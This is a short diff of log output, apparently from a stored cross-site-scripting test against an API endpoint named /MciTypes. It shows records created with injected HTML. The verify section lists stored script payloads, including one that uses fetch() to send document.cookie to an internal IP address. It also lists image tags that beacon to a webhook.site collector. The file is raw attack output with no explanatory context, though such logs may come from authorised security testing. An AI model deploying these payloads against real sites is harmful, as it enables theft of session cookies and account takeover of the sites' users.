@@ -1,0 +1,12 @@
+  [1004] POST /MciTypes status=201 len=203 loc=/MciTypes/1000023
+      new id=1000023 name=<img src="https://webhook.site/9938583b-2e29-4de9-8231-ac50b3e44016/4008_id1004?
+  [1005] POST /MciTypes status=201 len=203 loc=/MciTypes/1000024
+      new id=1000024 name=<img src="https://webhook.site/9938583b-2e29-4de9-8231-ac50b3e44016/4008_id1005?
+
+===== Verify =====
+GET /MciTypes: status=200 len=3958
+  id=1003 name=<script>alert(1)</script>
+  id=1013 name=<script>alert(document.cookie)</script>
+  id=1000021 name=<script>fetch('http://172.28.4.12:8080/?c='+document.cookie)</script>
+  id=1000023 name=<img src="https://webhook.site/9938583b-2e29-4de9-8231-ac50b3e44016/4008_id1004?case=4008_mci_xss">
+  id=1000024 name=<img src="https://webhook.site/9938583b-2e29-4de9-8231-ac50b3e44016/4008_id1005?case=4008_mci_xss">
